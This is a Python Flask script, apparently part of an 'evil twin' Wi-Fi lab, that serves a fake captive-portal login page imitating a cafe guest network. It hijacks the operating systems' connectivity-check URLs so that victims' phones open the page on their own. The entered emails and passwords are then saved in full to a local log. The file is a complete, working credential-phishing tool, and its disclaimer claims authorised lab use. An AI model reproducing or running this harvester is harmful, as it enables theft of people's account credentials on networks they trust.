#!/usr/bin/env python3
"""Captive-portal credential harvester for the AL-GHUL evil twin.

Runs on the gateway laptop. The twin's DNS (dns_spy) points the operating
system's captive-portal probe domains at this server, so the victim's phone
pops the familiar "Sign in to Wi-Fi" sheet on its own. Whatever they type is
logged. This is the richest data an evil twin gets, because the victim hands
over the password willingly: no decryption needed.

Why it works
  Phones test for a walled garden by fetching a known URL and checking the
  reply. Answer those probes with a redirect and the OS shows a login sheet.
    Android  /generate_204            expects HTTP 204, we 302 instead
    Apple    /hotspot-detect.html     expects "Success", we 302 instead
    Windows  /connecttest.txt         expects a fixed string, we 302 instead

Evidence   experiments/portal-creds.jsonl  (full, local only)
Console    prints MASKED creds, safe to project on screen.

Run:  python portal.py --port 80
Point the probe domains + a login domain at this host via the twin's DNS.
Authorised lab use only, against your own devices.
"""
from __future__ import annotations
import argparse, json, time
from pathlib import Path
from flask import Flask, request, redirect, Response

app = Flask(__name__)
EVIDENCE = Path(__file__).resolve().parent.parent / "experiments" / "portal-creds.jsonl"

LOGIN_PAGE = """<!doctype html><html><head><meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<title>Wi-Fi sign in</title><style>
 body{font-family:-apple-system,Segoe UI,Roboto,sans-serif;background:#f2f2f7;margin:0;
   display:flex;min-height:100vh;align-items:center;justify-content:center;color:#1c1c1e}
 .card{background:#fff;max-width:360px;width:90%;padding:28px 24px;border-radius:14px;
   box-shadow:0 1px 3px rgba(0,0,0,.12)}
 h1{font-size:19px;margin:0 0 4px}.sub{color:#8e8e93;font-size:13px;margin:0 0 20px}
 label{display:block;font-size:13px;margin:14px 0 6px}
 input{width:100%;box-sizing:border-box;padding:11px;border:1px solid #d1d1d6;border-radius:9px;font-size:16px}
 button{width:100%;margin-top:20px;padding:12px;border:0;border-radius:9px;background:#007aff;
   color:#fff;font-size:16px;font-weight:600}
 .foot{color:#aeaeb2;font-size:11px;text-align:center;margin-top:16px}</style></head>
<body><form class=card method=post action="/login">
 <h1>Sign in to Wi-Fi</h1><p class=sub>Kaffi_FRI &middot; Guest access</p>
 <label>Email</label><input name=username type=email autocomplete=username required>
 <label>Password</label><input name=password type=password autocomplete=current-password required>
 <button>Connect</button>
 <p class=foot>By connecting you agree to the terms of use.</p>
</form></body></html>"""

DONE_PAGE = """<!doctype html><meta charset=utf-8><title>Connected</title>
<body style="font-family:sans-serif;text-align:center;padding-top:60px">
<h2>You are connected.</h2><p>You can return to your browser.</p></body>"""

PROBE_PATHS = {"/generate_204", "/gen_204", "/hotspot-detect.html",
               "/connecttest.txt", "/ncsi.txt", "/success.txt", "/canonical.html"}


def mask(secret: str) -> str:
    if not secret:
        return "(empty)"
    return secret[0] + "*" * (len(secret) - 1) + f" (len {len(secret)})"


@app.post("/login")
def login():
    user = request.form.get("username", "")
    pw = request.form.get("password", "")
    rec = {"ts": time.strftime("%Y-%m-%dT%H:%M:%S"), "ip": request.remote_addr,
           "ua": request.headers.get("User-Agent", ""), "username": user, "password": pw}
    EVIDENCE.parent.mkdir(parents=True, exist_ok=True)
    with EVIDENCE.open("a", encoding="utf-8") as f:
        f.write(json.dumps(rec) + "\n")
    # Masked on screen so a projected terminal never shows the live password.
    print(f"[CAPTURED] {request.remote_addr}  user={user!r}  pass={mask(pw)}")
    return DONE_PAGE


@app.route("/", defaults={"path": ""})
@app.route("/<path:path>")
def catch_all(path):
    # OS captive-portal probes: redirect them so the login sheet appears.
    if request.path in PROBE_PATHS or request.path.endswith("generate_204"):
        return redirect("http://kaffi-fri.login/", code=302)
    return Response(LOGIN_PAGE, mimetype="text/html")


def main():
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--host", default="0.0.0.0")
    ap.add_argument("--port", type=int, default=80)
    args = ap.parse_args()
    print(f"[*] captive portal on {args.host}:{args.port}")
    print(f"[*] evidence -> {EVIDENCE}")
    print("[*] point the OS probe domains + a login domain at this host via the twin DNS")
    app.run(host=args.host, port=args.port, threaded=True)


if __name__ == "__main__":
    main()
